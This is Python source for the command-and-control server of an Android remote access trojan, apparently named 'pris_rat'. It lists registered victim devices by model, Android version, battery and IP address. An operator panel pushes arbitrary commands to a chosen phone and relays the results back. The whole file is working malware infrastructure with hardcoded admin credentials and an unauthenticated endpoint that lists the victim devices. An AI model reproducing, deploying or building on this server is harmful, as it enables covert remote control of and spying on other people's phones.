from flask import Flask, render_template, request, redirect, session, jsonify
from flask_socketio import SocketIO, emit, join_room
import os, uuid
from datetime import datetime

ADMIN_USER = "Pris"
ADMIN_PASS = "you are77"
SECRET_KEY = os.environ.get("SECRET_KEY", "pris_rat_secret_2026")

app = Flask(__name__)
app.secret_key = SECRET_KEY
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

devices = {}

@app.route("/")
def index():
    if "user" in session:
        return redirect("/dashboard")
    return redirect("/login")

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if u == ADMIN_USER and p == ADMIN_PASS:
            session["user"] = u
            return redirect("/dashboard")
        error = "بيانات غير صحيحة"
    return render_template("login.html", error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    total = len(devices)
    online = sum(1 for d in devices.values() if d.get("online"))
    dev_list = [{"id": k, "model": v.get("model","?"), "android": v.get("android","?"),
                 "battery": v.get("battery",0), "ip": v.get("ip","?"),
                 "online": v.get("online",False)} for k,v in devices.items()]
    return render_template("dashboard.html",
                           total=total, online=online,
                           offline=total-online, devices=dev_list,
                           session_user=session.get("user", "Admin"))

@app.route("/screen")
def screen_view():
    if "user" not in session:
        return redirect("/login")
    return render_template("screen.html")

@socketio.on("register")
def on_register(data):
    did = data.get("id", str(uuid.uuid4())[:8])
    devices[did] = {"id": did, "model": data.get("model","Unknown"),
                    "android": data.get("android","?"), "battery": data.get("battery",0),
                    "ip": request.remote_addr, "online": True,
                    "sid": request.sid}
    join_room(did)
    emit("registered", {"id": did}, room=request.sid)
    socketio.emit("devices_update", devices, broadcast=True)
    print(f"[+] Device: {did}")

@socketio.on("send_command")
def on_send_command(data):
    target = data.get("target")
    action = data.get("action")
    params = data.get("params", {})
    if target and target in devices:
        cmd = {"action": action}
        cmd.update(params)
        socketio.emit("execute", cmd, room=target)
        print(f"[>] {target}: {action}")

@socketio.on("response")
def on_response(data):
    socketio.emit("device_response", data, broadcast=True)

@app.route("/api/devices")
def api_devices():
    return jsonify(devices)

@app.route("/api/ping")
def api_ping():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    socketio.run(app, host="0.0.0.0", port=port, debug=False, allow_unsafe_werkzeug=True)